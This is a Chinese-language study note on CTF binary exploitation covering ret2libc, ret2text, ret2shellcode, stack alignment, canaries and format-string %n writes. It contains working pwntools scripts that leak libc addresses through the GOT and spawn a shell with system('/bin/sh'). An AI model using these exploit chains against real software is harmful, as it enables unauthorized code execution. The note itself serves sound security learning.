但是如果开始调用某个函数，就会为plt表项增加一个 system

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/027b5b468ed1bf72.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/9059e8aac0d9a87b.png)

为什么函数指令地址向上 1个字长 是他的参数的地址

`push ebp` 压入的是调用者 EBP，用于保存帧指针；返回地址由前一条 `call` 指令压入。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ab478850be43a4a7.png)

#### 动态链接过程

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c90ef36db8412501.png)

： **调用** `system@plt` **会跳转到** `system@got` **，然后再到真正的** `system` **函数。**

GOT 是 **函数地址的“缓存”**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/3e1f8b2e9e4f8a26.png)

若程序导入了 `system` ，跳转到 `system@plt` 会经 GOT 表项进入 `system` 的真实实现；首次调用时可能先执行动态解析。

没有 system 的就需要先泄露 GOT表

## 算 变量到 栈底的距离可靠的办法

```plain
b main

r

AAAA

stack 24   查看栈的低24步长
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/1c61a53badfe40fd.png)

-   泄露 \__libc_start_main 地址
-   获取 libc 版本
-   获取 system 地址与 /bin/sh 的地址
-   再次执行源程序
-   触发栈溢出执行 system(‘/bin/sh’)

```plain
esp 0xffffcfa0 —▸ 0xffffcfbc ◂— 'AAAAAA'
22:0088│ ebp 0xffffd028 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
```

0xffffd028- 0xffffcfbc

d028-cfbc = 108

加上 4 就是 112

-   程序启动时， `_start` → `__libc_start_main` → `main`
-   所以它的 GOT 条目 **一定已经被解析** （不受延迟绑定影响）

-   在 libc-database 中， `__libc_start_main` 的偏移几乎每个版本都有记录

```plain
from pwn import *
elf = ELF("./vuln")
start_main_got = elf.got['__libc_start_main']
```

pwn 库里面就有 got 寻找的方法

```plain
泄露 __libc_start_main 地址
获取 libc 版本
获取 system 地址与 /bin/sh 的地址
再次执行源程序
触发栈溢出执行 system(‘/bin/sh’)
```

-   `puts(addr)` 会把 `addr` 指向的字节当作 C 字符串输出，直到遇到 `\x00` 。
-   虽然 GOT 条目不是字符串，但它的内容是 **8 字节地址（小端）**
-   在 x86-64 上，地址通常形如

```plain
  0x7f1234567890
```

→ 内存中为：

```plain
90 78 56 34 12 7f 00 00   ← 小端，高字节为 0（ASLR 地址高位常为 0）
```

-   `puts` 会打印前 6 个非零字节（ `90 78 56 34 12 7f` ），正好可以恢复地址！

> 所以： `puts(got_addr)` **\= 泄露 GOT 条目内容 = 泄露 libc 函数地址**

```plain
[*] '/home/alexander/桌面/newstar/ret2text4'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

╰─ ROPgadget --binary ret2libc3  --only 'pop|ret'                                   ─╯
Gadgets information
============================================================
0x080486ff : pop ebp ; ret
0x080486fc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804841d : pop ebx ; ret
0x080486fe : pop edi ; pop ebp ; ret
0x080486fd : pop esi ; pop edi ; pop ebp ; ret
0x08048406 : ret
0x0804854e : ret 0xeac1
```

**只要知道偏移，就能算出 libc 基址 → 进而算出任何函数地址**

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts'] //获取puts的在libc中的地址  ，因为已经调用过 puts 所以 可以直接调用

libc_start_main_got = ret2libc3.got['__libc_start_main']  # 获取 `__libc_start_main` 的 GOT 表项地址
main = ret2libc3.symbols['main']  #获取程序中 main 函数的虚拟地址（VA），用于在第一次 ROP 泄露后，让程序跳转回 main 函数重新执行，从而实现“二次输入”以完成最终利用。

print("leak libc_start_main_got addr and return to main again")
payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter(b'Can you find it !?', payload)

print("get the related addr")
libc_start_main_addr = u32(sh.recvn(4))  # 接收 32 位泄露地址

libc = LibcSearcher('__libc_start_main', libc_start_main_addr) #匹配libc版本
libcbase = libc_start_main_addr - libc.dump('__libc_start_main') #计算基地址    libc_start_main_addr = libc_base + offset
#.dump() 是 LibcSearcher 库中的一个方法（method），用于 根据符号名（如 'system'、'__libc_start_main'）返回该符号在目标 libc 中的偏移量（offset）

system_addr = libcbase + libc.dump('system')  
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat([b'A' * 112, system_addr, 0xdeadbeef, binsh_addr])  # 第二次偏移应以重新进入 main 后的实际栈布局为准
sh.sendline(payload)

sh.interactive()
```

第一次泄露的栈布局

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c02cf46b4344c12b.png)

第一次泄露 出 `` ` libc_start_main_got ` ` `` 的地址

第二次溢出的 栈布局

为什么这次变成了104

哦哦 因为我们ret2main了一次

-   当你执行 `ret` 跳转回 `main` 的地址时，你的栈指针 `esp` 的位置取决于你发送的 payload 长度和之前的栈操作。
-   **关键点**：如果你的 payload 或跳转过程导致 `esp` 的值比正常启动时 **“歪”了 4 个字节** （例如少弹出了一个值，或者对齐状态改变），再次进入 `main` 时：

-   `mov ebp, esp` ： `ebp` 记录了这时候“歪”了的栈顶位置。
-   `and esp, 0xfffffff0` ： `esp` 再次被强制对齐到 16 字节（抹平了那 4 字节的差异）。

-   **结果**：

-   **局部变量** `s` 是基于对齐后的 `esp` 寻址的，所以它在内存中的“绝对位置”是整齐的。
-   `ebp` 却停留在那个“歪”了 4 字节的位置（因为它是在对齐前保存的）。
-   因此， `ebp` 和 `s` 之间的距离就缩短（或改变）了 **4 字节**。

### 图解对比

假设局部变量 `s` 总是位于 `aligned_esp + 0x20` 。

-   **第一次 (Distance 108):**

-   Entry ESP = `...0x...C` (假设)
-   `ebp` = `...0x...C`
-   `aligned_esp` = `...0x...0` (抹去了 0xC)
-   `s` = `...0x...0` + 0x20
-   距离 = `ebp` - `s` = `0xC` +... (导致最终计算出 108)

-   **第二次 (Distance 104):**

-   Entry ESP = `...0x...8` (**比原来低了 4 字节**)
-   `ebp` = `...0x...8`
-   `aligned_esp` = `...0x...0` (依然对齐到这里)
-   `s` = `...0x...0` + 0x20 (位置不变)
-   距离 = `ebp` - `s` = `0x8` +... (**比 108 少了 4**) -> **104**

```plain
高地址 (High Address)
+------------------+
|  Return Address  |  <-- 指令1 (CALL) 压入 (4字节) \
+------------------+                              | 这就是那
|    Saved EBP     |  <-- 指令2 (PUSH) 压入 (4字节) / "少了的8字节"
+------------------+
|                  |
|   Buffer (112)   |  <-- 你计算出的 112 字节空间
|                  |
|                  |
+------------------+
低地址 (Low Address) <-- ESP (栈顶)
```

这是两个非常棒的问题，直接触及了 ROP (Return Oriented Programming) 和栈帧机制的核心。

简单回答：

1.  **EIP 会执行 Main 的开始吗？**—— **是的**，完全从头开始（Prologue）。
2.  **还是发生在 Main 函数栈帧里面吗？**—— **不完全是**。逻辑上这是一个 **新** 的栈帧，物理上它位于比第一次栈帧 **更低** （更深）的内存地址处。

这就解释了你之前遇到的 `108` 变 `104` 的问题。让我们详细拆解一下这个过程：

### 1\. EIP 的流向：为什么从头开始？

当 `puts` 执行完毕执行 `ret` 指令时，它会做两件事：

1.  从栈顶弹出一个值（这个值就是你在 payload 里写的 `main` 的地址）。
2.  将 `EIP` 设置为这个值。

因为你填入的是 `main` 函数的 **起始地址** （Entry Point），所以 CPU 会乖乖地跳到 `main` 的第一行汇编指令去执行：

代码段

```plain
push ebp      ; 保存现场
mov ebp, esp  ; 建立新栈底
...
```

所以， **程序逻辑完全重置了**，就像程序刚启动一样重新进入了 `main` 。

### 2\. 栈帧的变化：为什么会“移位”？

这是最关键的部分。虽然代码重跑了，但 **栈的状态（ESP）变了**。

#### 第一次进入 Main (程序启动时)

操作系统负责清理一切，ESP 指向一个非常整洁的位置。

#### 第二次进入 Main (Ret2Main 时)

这就是问题的根源。让我们看看你的 Payload 在 `puts` 返回后的残余状态：

```plain
payload = [padding, puts_plt, main, arg]
```

1.  **调用 puts 时**： `puts` 取走了栈顶的 `puts_plt` 。
2.  **puts 内部**：它认为栈顶的 `main` 是返回地址，下面的 `arg` (`libc_start_main_got`) 是它的参数。
3.  **puts 返回时 (ret)**：

-   `pop eip` ：它把 `main` 的地址弹出来给了 EIP。
-   **注意 ESP 的位置！** `ret` 指令执行后，ESP 指向了下一个位置，也就是 `arg` 所在的位置。

**关键点来了：** 在标准的 C 语言调用约定（cdecl）中， **调用者（Caller）负责清理参数**。正常情况下，调用完 `puts` 后应该有一个 `add esp, 4` 来把参数弹出去。 但是，你的 ROP 链 **没有** 这步操作。

所以，当第二次 `main` 开始执行 `push ebp` 时， **那个参数（arg）还留在栈上！**

```plain
[ 内存高地址 ]
...
+------------------+
| libc_start_main  | <--- 此时 ESP 指向这里 (这是 puts 的参数，没人清理它！)
+------------------+
|   Saved EBP      | <--- 第二次 main 执行 push ebp，压在这个参数下面
+------------------+
|                  |
|  New Main Frame  |
|                  |
[ 内存低地址 ]
```

### 3\. 结合之前的 "108 vs 104"

正是因为这个 **没人清理的参数（4字节）**，导致第二次进入 `main` 时，初始的 ESP 比第一次进入时 **低了 4 个字节**。

-   **第一次：** ESP 初始位置是 `X` 。
-   **第二次：** ESP 初始位置是 `X - 4` 。

当 `main` 函数里的 `and esp, 0xfffffff0` （对齐指令）执行时：

-   如果 `X` 刚好是对齐的（比如结尾是0）。
-   那么 `X - 4` （结尾是C）就 **不对齐** 了。
-   `and` 指令会强制把 ESP 再往下拉，这就导致了 `EBP` （记录了对齐前的 ESP）和局部变量（基于对齐后的 ESP）之间的 **相对距离发生了变化**。

### 总结

1.  **执行流：** 是的， `main` 从第一行汇编代码重新开始执行。
2.  **栈位置：** 这是一个 **新** 的栈帧，而且它是在旧栈帧的 **下方** （低地址方向）建立的，中间夹着那个未被清理的 `puts` 参数。
3.  **影响：** 正是这个未清理的参数导致了 4 字节的错位，进而通过 `and esp` 对齐机制改变了溢出偏移量（Offset）。

```plain
[ 高地址 High Address ]
       
+-----------------------------+
|    ... 旧栈帧残留数据 ...     |
+-----------------------------+
|    libc_start_main_got      | <---【罪魁祸首】这是 puts 的参数 (4字节)
|   (未被清理，导致错位)        |     它现在变成了 main 上方的数据
+-----------------------------+ 
|        Saved EBP            | <--- 第二次 main 的 EBP 指向这里
| (对应第二次输入的 padding后4位)|     (地址比第一次低，更靠近下方的对齐线)
+-----------------------------+ <--- current EBP
|                             |
|       对齐填充 (Gap)         | <--- 这里只有 4 字节了 (第一次是 8 字节)
|                             |
+-----------------------------+ <--- 16字节对齐线 (and esp, 0xf0 的结果)
|                             |
|                             |
|      Buffer 's' (100字节)   |
|                             |
|                             |
+-----------------------------+ <--- current ESP
       
       [ 低地址 Low Address ]
```

使用给定的 libc版本

```plain
from pwn import *

sh = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('./libc.so.6')  # ← 直接加载题目给的 libc

# 泄露 __libc_start_main 地址
payload = flat([b'A'*112, elf.plt['puts'], elf.symbols['main'], elf.got['__libc_start_main']])
sh.sendlineafter(b'?', payload)

# 接收地址
leaked = u32(sh.recv(4).ljust(4, b'\x00'))

# 计算基址
libc.address = leaked - libc.symbols['__libc_start_main']

# 获取 system 和 /bin/sh
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

# 第二次利用
payload2 = flat([b'A'*112, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload2)
sh.interactive()
```

当 `gets@plt` 返回后，需要通过能消耗一个栈槽的 gadget（如 `pop ebx; ret` ）清理其参数并继续 ROP 链。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/82b959459469896a.png)

为什么此时 eip指向了 buf2

```plain
pop ebx	将栈顶 4 字节弹出 → 存入 ebx 寄存器
2️⃣	ret	从栈顶弹出 4 字节 → 写入 eip
```

如果只有一次输入：

```plain
lea rax, [rbp-0x64]  ; ← 栈地址
mov rsi, rax
call read            ; ← 只读一次
```

→ **纯栈利用**，shellcode 在栈上

如果有两次输入：

```plain
mov rsi, 0x4040a0    ; ← BSS 地址
call read            ; ← 第一次：到 BSS

lea rax, [rbp-0x64]  ; ← 栈地址
mov rsi, rax
call read            ; ← 第二次：到栈
```

→ **BSS 利用**，需要两次输入

## pwndbg 使用指令

```c
gdb  ret2libc3

b main   / b *0x111222      # 下断点
    
n                         # 单步步过
    
s                         # 单步步入

plt            查看plt节

got            查看got表

`x/20gx`：以 8 字节为单位查看 20 个值。

backtrace    查看函数调用栈的关系

`finish`：继续执行到当前函数返回；`return`：强制从当前函数返回（可选指定返回值）。
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7df92c4dc4c9b07d.png)

## 热身赛ret2text

```plain
╰─ checksec ret2text                                                                ─╯
[*] '/home/alexander/桌面/newstar/ret2text'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
在 x86-64 System V ABI 中，调用者在执行 `call` 前通常将 RSP 对齐到 16 字节；由于 `call` 压入 8 字节返回地址，函数入口处常见 `rsp % 16 == 8`。目标函数可能在自身序言中调整对齐。ROP 链需结合这一规则与实际 RSP 计算。
```

-   溢出后，返回地址会被覆盖为 ret_address（0x40101a）。
-   函数返回时跳转到 0x40101a，该地址处是一条 ret 指令。
-   这条 ret 会从当前栈顶取出 shell_addr，随后跳转到 0x401176。
-   两次 ret 共使 RSP 增加 16 字节；是否满足对齐仍应在调试器中确认。

system：0x401176

64位要考虑栈对齐

p64 需要是 偶数

```plain
64  +8  //72
```

-   `buf` 起始地址： `rbp - 0x40`
-   `saved rbp` ： `rbp`
-   返回地址： `rbp + 8`

你写了 `0x48 = 72` 字节：

-   64 字节填满 `buf`
-   8 字节覆盖 `saved rbp`
-   接下来的 8 字节（ `0x40101a` ）覆盖 **返回地址**

### Step 1: vuln 函数返回

-   执行 `leave; ret`
-   `ret` 弹出你写的 `0x40101a` → 跳转到 `0x40101a`

### Step 2: 执行 0x40101a 处的指令

-   如果这里是

```plain
  ret
```

，那么 CPU 执行：

```plain
  ret   ; 等价于 pop rip
```

-   此时 **栈顶是什么？** → 是你 payload 中的下一项： `bd = 0x401176`

所以：

-   `pop rip` → `rip = 0x401176`
-   CPU 开始执行 `0x401176` 处的代码（比如 `system("/bin/sh")` 或后门函数）

###### gets 的写入方向（逻辑）

-   `gets(buf)` 从 `buf[0]` 开始， **按内存地址递增顺序写入**
-   即： `buf[0]` → `buf[1]` → `buf[2]` →...
-   对应内存地址： **低地址 → 高地址**

```plain
高地址
+------------------+  ← rsp 初始值（比如 0x7fffffffe500）
| 返回地址 (_start)|  ← main 的返回地址（被 gets 溢出后覆盖的目标！）
+------------------+
| ...              |
+------------------+
| v4[7] (last)     |  ← rsp + 56 ~ rsp + 63
| ...              |
| v4[0]            |  ← rsp （gets 写入起点）
+------------------+  ← 当前 rsp（栈顶，低地址）
低地址
```

###### 栈布局（从高地址 → 低地址）：

```plain
高地址
+--------------------------+
| 命令行参数、环境变量...   |
+--------------------------+
| _start 的局部数据         |
+--------------------------+
| （_start 调用 main 时）   |
| main 的返回地址           | ← 这是 `_start` 中 call main 的下一条指令
+--------------------------+  ← 这里是 **main 栈帧的顶部（高地址端）**
| main 的 saved rbp (可选)  |
| main 的局部变量 (v4[64])  |
| ...                       |
| （main 调用 gets 时）     |
| gets 的返回地址           | ← 由 call gets 压入（但在你的代码中，gets 是 PLT 调用）
+--------------------------+
| gets 的栈帧（局部变量等） | ← 理论上在这里，但实际上...
低地址
```

* * *

###### 三、关键点：gets 在你的程序中 没有创建新栈帧！

为什么？

因为你的代码是

```plain
gets(v4);   // v4 是 main 的局部数组
```

-   `gets` 是一个 **外部库函数** （在 libc 中）
-   它确实会创建自己的栈帧，但：

-   它的栈帧在 `main` **栈帧的下方（更低地址）**
-   `gets` **内部使用你传入的** `v4` **地址作为缓冲区，而不是用自己的栈空间存输入！**

> 所以： **溢出发生在** `main` **的栈帧内（** `v4` **所在位置），不是** `gets` **的栈帧内！**

```plain
高地址（先压入，地址大）
+------------------+  ← rbp + 8  ← **返回地址** ← 你覆盖的位置（放后门地址）
| 返回地址         |  ← 你覆盖成：0x401176（后门函数）
+------------------+  ← rbp
| saved rbp        |
+------------------+
| 局部变量 (v4)    |  ← gets 写入起点（低地址）
| ...              |
+------------------+  ← rsp（栈顶，当前栈指针）
低地址
高地址
+------------------+
| 0x401176         | ← 返回地址位置（被你覆盖）
+------------------+ ← rsp 指向这里（当 vuln 准备 ret 时）
| ... (局部变量)   |
低地址
```

### 执行 ret 时：

1.  CPU 执行 `pop rip`
2.  从 `rsp` 处读取 `0x401176`
3.  设置 `rip = 0x401176`
4.  现在 CPU 开始 **从地址** `0x401176` **处取指令并执行**

-   `rip` （Instruction Pointer）是 **CPU 的指令指针寄存器**
-   它永远指向下一条要执行的 **指令的地址**
-   CPU 会从 `rip` 指向的内存位置 **取出机器码并执行**

**而是通过** `leave` **（或手动调整** `rsp` **）将栈顶指针** `rsp` **恢复到函数入口时的位置，  
然后** `ret` **再从这个新** `rsp` **处弹出返回地址。**

### 调用时栈布局（简化）：

```plain
高地址
+------------------+ ← rbp + 8
| 返回地址 (main+X)| ← 我们要覆盖的目标
+------------------+ ← rbp（vuln 的 rbp）
| saved rbp (main) |
+------------------+
| buf[63]          |
| ...              |
| buf[0]           | ← rsp（函数开始时 sub rsp, 0x40 后的位置）
低地址
```

###### 执行 leave; ret 时发生了什么？

Step 1: `leave`

```plain
mov rsp, rbp   ; rsp 现在指向 saved rbp（即原 rbp 位置）
pop rbp        ; 从 rsp 弹出 saved rbp → rbp = 被覆盖的值（如 0x4141414141414141）
               ; rsp += 8 → 现在 rsp 指向 **返回地址位置**
```

> 此时： `rsp` **指向你覆盖的返回地址（** `0x401176` **）**

Step 2: `ret`

```plain
pop rip        ; 从 rsp 读取 8 字节 → rip = 0x401176
rsp += 8       ; rsp 现在指向返回地址之上的位置（比如你的 payload 中的下一个 gadget）
00:0000│ rax rsp 0x7fffffffddf0 ◂— 'AAAAAAAAAA'
00:0000│ rax rsp 0x7fffffffddf0 ◂— 'AAAAAAAAAA'
01:0008│-038     0x7fffffffddf8 ◂— 0x10101004141 /* 'AA' */
02:0010│-030     0x7fffffffde00 ◂— 2
03:0018│-028     0x7fffffffde08 ◂— 0x1f8bfbff
04:0020│-020     0x7fffffffde10 —▸ 0x7fffffffe2a9 ◂— 0x34365f363878 /* 'x86_64' */
05:0028│-018     0x7fffffffde18 ◂— 0x64 /* 'd' */
06:0030│-010     0x7fffffffde20 ◂— 0x1000
07:0038│-008     0x7fffffffde28 —▸ 0x401090 (_start) ◂— endbr64 
08:0040│ rbp     0x7fffffffde30 ◂— 1
```

## 热身赛ret2shellcode

```plain
─ checksec ret2shellcode                                                           ─╯
[*] '/home/alexander/桌面/newstar/ret2shellcode'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

RWX: Has RWX segments

有 同时 可读可写可执行权限

就可以打 shellcode

```plain
rsi rsp 0x7fffffffdd20 ◂— 'AAAAAAAA\n'

20:0100│ rbp     0x7fffffffde20 ◂— 1
```

e20-d20

溢出距离就是 `` `'0x100'` ``

```plain
  0x7ffffffde000     0x7ffffffff000 rwxp    21000      0 [stack]
```

直接写到栈上

```plain
  const targetOrder = [8,3,9,7,5,1,7,2,1];
                    const correctPhrase = "UNDEFINED IS NOT A FUNCTION BUT A LIFESTYLE";
```

程序太不稳定

## level5

plt 里面只有 write的plt节的内容

```plain
pwndbg> plt
Section .plt 0x400420-0x400460:
0x400430: write@plt
0x400440: read@plt
0x400450: __libc_start_main@plt
```

### 栈对齐问题

|     |     |     |
| --- | --- | --- |  
| 目标地址类型 | 是否需要对齐 | 说明  |
| `one_gadget` | 取决于具体 gadget | 需同时满足其寄存器、栈和内存约束，不能一概而论。 |
| 简单 `win()` 函数 | 视实现而定 | 若调用了需要对齐的函数，仍可能受 ABI 影响。 |
| `system()` / libc 函数 | 通常需要遵循 ABI | libc 内部可能使用需要对齐的指令；以目标平台和路径为准。 |
| `puts()` / `printf()` | 通常需要遵循 ABI | ROP 调用前应验证入口处栈状态。 |

### Canary 实现原理

开启canary的 栈布局

```plain
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address
```

## 格式化字符串

```plain
ROPgadget --binary ret2text4 --string '/bin/sh' 
0x0000000000402004 : /bin/sh   
```

后门地址 `` `0x401156` ``

```plain
rsi rsp 0x7fffffffddf0 ◂— 0x4141414141414141 ('AAAAAAAA')

rbp     0x7fffffffde30 ◂— 1
```

e30 -df0

64 +8

72

```plain
ROPgadget --binary ./ret2text4  --only "ret"
from pwn import *
#io = remote("175.27.251.122", 33325)
io = process("./ret2text4")
bd = 0x401156
pd = b'a'*72
pd += p64(0x000000000040101a)
pd += p64(bd)
io.sendline(pd)
io.interactive()
```

为什么会出现格式化字符串的问题

格式化字符串漏洞通常源于把外部可控数据直接作为格式串，例如 `printf(user_input)` 。格式串中的转换说明符会让 `printf` 按 ABI 从参数位置读取值；攻击者若能控制格式串或参数布局，可能造成信息泄露， `%n` 在可控目标地址条件下还可能写入内存。

当 `printf` 遇到 `%n` 时，它的逻辑是这样的：

-   **指令含义**：“请把我目前为止打印的字符数量，写入到 **某个内存地址** 中。”
-   **寻找目标**：为了执行这个“写入”操作， `printf` 必须知道 **往哪里写**。这个“哪里”（即目标地址），通常应该作为参数传递给 `printf` 。
-   **参数缺失**：如果你在代码中只写了 `printf(user_input)` ，没有提供额外的参数（比如 `printf(user_input, &target_var)` ）， `printf` 就会去栈上“找”这个地址。
-   **结果**：它会把栈上当前指针位置的数据（其实是上一个函数的残留数据或局部变量） **误认为** 是“目标地址”，并尝试向那个地址写入数据。

`%n` **(写入长度)**：

这是格式化占位符

```plain
当 printf 执行 "Count: %n" 时：
打印：先打印 "Count: "（共 7 个字符）。
遇到 %n：printf 心想：“老板让我把目前的字符数（7）写到一个地址里。”
寻找地址：printf 按照顺序，去拿后面的第一个参数，也就是 &target_var。
写入：它将数字 7 写入到 target_var 所在的内存地址中。
```

当程序存在格式化字符串漏洞且攻击者能够可靠控制 `%n` 对应的目标地址与输出长度时， `%n` 可用于受控内存写入。常见利用思路包括：

1.  **信息泄露阶段**：利用 `%p` 或 `%x` 等格式化指令，从栈上泄露关键地址（如GOT表中 `puts` 或 `printf` 的地址）通过泄露的地址计算出 `libc` 基址（绕过ASLR的关键）
2.  **控制流劫持阶段**：利用 `%n` 将计算出的ROP链起始地址（或关键gadget地址）写入目标位置主要目标位置： **GOT表项**：将 `printf@got` 或 `puts@got` 的值修改为ROP链起始地址 **返回地址**：直接覆盖栈上的函数返回地址 **函数指针**：修改程序中使用的函数指针
3.  **ROP链执行阶段**：当程序后续调用被修改的函数（如 `printf` ）时，实际跳转执行的是ROP链ROP链按顺序执行多个gadget，最终实现攻击目标（如获取shell）
